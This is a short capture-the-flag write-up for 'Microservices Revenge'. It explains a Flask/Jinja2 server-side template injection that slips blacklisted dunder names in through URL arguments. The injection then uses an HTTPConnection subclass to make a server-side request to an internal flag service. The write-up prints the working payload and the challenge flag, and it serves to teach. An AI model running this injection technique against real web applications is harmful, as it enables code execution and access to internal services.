# Microservices Revenge

### Challenge Details

I've upgraded the security of this website and added a new feature.
Can you still break it?

### Key Concepts

1. Server Side template injection in admin service
2. Find the HttpRequest object in the admin service
3. Create a payload to get the flag using SSTI


### Solution

1. Go to admin page and insert additional arguments in the URL.
2. Insert payload into the cookie for user.
3. Read the flag

```url
/?service=adminpage&cl=__class__&mro=__mro__&sub=__subclasses__&getitem=__getitem__
```

```python
{%set conn=""|attr(request.args.cl)|attr(request.args.mro)|attr(request.args.getitem)(1)|attr(request.args.sub)()|attr(request.args.getitem)(481)("flagpage")%}{{conn.request("GET","/flag")}}{{conn.getresponse().read()}}
```

### Learning Objectives

1. Server Side Template Injection
2. Writing templates in flask
3. Making a HTTP request using `HTTPConnection` class

### Flag
`grey{55t1_bl4ck1ist_byp455_t0_S5rf_538ad457e9a85747631b250e834ac12d}`
